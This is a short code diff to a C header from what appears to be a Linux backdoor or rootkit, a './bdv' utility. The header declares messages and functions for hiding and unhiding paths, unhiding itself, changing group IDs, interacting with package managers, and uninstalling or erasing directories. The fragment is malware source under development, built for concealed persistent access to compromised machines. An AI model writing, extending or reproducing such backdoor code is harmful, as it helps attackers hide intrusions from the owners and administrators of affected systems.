@@ -7,10 +7,6 @@
 
 
 #ifdef BACKDOOR_UTIL
-/* all of the messages that can/will be displayed upon interaction with `./bdv` utils. */
-
-#define ERR_NO_OPTION     "valid commands:\n\t./bdv hide/unhide <path>\n\t./bdv unhideself/changegid (if applicable)\n\t./bdv apt/yum/pacman/emerge (if applicable)\n"
-
 #define ERR_ACSS_PATH     "access failed on path. does it exist?"
 #define ALRDY_HIDDEN_STR  "path is already hidden..."
 #define PATH_HIDDEN_STR   "path now hidden"
@@ -24,8 +20,10 @@ static char *const validpkgmans[4] = {"apt", "yum",
                                       "pacman", "emerge"};
 #endif
 
+void option_err(char *a0);
+void eradicatedir(const char *target);
+void uninstallbdv(void);
 void do_self(void);
-void option_err(void);
 void dobdvutil(char *const argv[]);
 #include "magicutils.c"
 #endif
